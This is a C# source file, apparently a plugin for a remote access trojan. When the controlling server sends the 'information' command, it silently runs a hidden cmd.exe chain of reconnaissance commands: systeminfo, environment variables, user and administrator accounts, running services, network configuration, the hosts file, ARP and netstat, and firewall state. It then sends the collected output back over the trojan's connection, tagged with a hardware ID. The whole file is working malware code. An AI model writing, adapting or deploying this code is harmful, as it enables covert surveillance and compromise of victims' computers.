using System;
using System.Diagnostics;
using MessagePackLib.MessagePack;

namespace Plugin
{
    public static class Packet
    {
        public static void Read(object data)
        {
            try
            {
                var unpack_msgpack = new MsgPack();
                unpack_msgpack.DecodeFromBytes((byte[])data);
                switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
                {
                    case "information":
                    {
                        Connection.Send(InformationList());
                        break;
                    }
                }
            }
            catch (Exception ex)
            {
                Error(ex.Message);
            }
        }

        public static void Error(string ex)
        {
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Error";
            msgpack.ForcePathObject("Error").AsString = ex;
            Connection.Send(msgpack.Encode2Bytes());
        }

        public static byte[] InformationList()
        {
            var back = execCMD(
                @"echo ####System Info#### & systeminfo & echo ####System Version#### & ver & echo ####Host Name#### & hostname & echo ####Environment Variable#### & set & echo ####Logical Disk#### & wmic logicaldisk get caption,description,providername & echo ####User Info#### & net user & echo ####Online User#### & query user & echo ####Local Group#### & net localgroup & echo ####Administrators Info#### & net localgroup administrators & echo ####Guest User Info#### & net user guest & echo ####Administrator User Info#### & net user administrator & echo ####Startup Info#### & wmic startup get caption,command & echo ####Tasklist#### & tasklist /svc & echo ####Ipconfig#### & ipconfig/all & echo ####Hosts#### & type C:\WINDOWS\System32\drivers\etc\hosts & echo ####Route Table#### & route print & echo ####Arp Info#### & arp -a & echo ####Netstat#### & netstat -ano & echo ####Service Info#### & sc query type= service state= all & echo ####Firewallinfo#### & netsh firewall show state & netsh firewall show config");
            var msgpack = new MsgPack();
            msgpack.ForcePathObject("Pac_ket").AsString = "Information";
            msgpack.ForcePathObject("ID").AsString = Connection.Hwid;
            msgpack.ForcePathObject("InforMation").AsString = back;
            return msgpack.Encode2Bytes();
        }

        public static string execCMD(string command)
        {
            var pro = new Process();
            pro.StartInfo.FileName = "cmd.exe";
            pro.StartInfo.UseShellExecute = false;
            pro.StartInfo.RedirectStandardError = true;
            pro.StartInfo.RedirectStandardInput = true;
            pro.StartInfo.RedirectStandardOutput = true;
            pro.StartInfo.CreateNoWindow = true;
            //pro.StartInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
            pro.Start();
            pro.StandardInput.WriteLine(command);
            pro.StandardInput.WriteLine("exit");
            pro.StandardInput.AutoFlush = true;
            //获取cmd窗口的输出信息
            var output = pro.StandardOutput.ReadToEnd();
            pro.WaitForExit(); //等待程序执行完退出进程
            pro.Close();
            return output;
        }
    }
}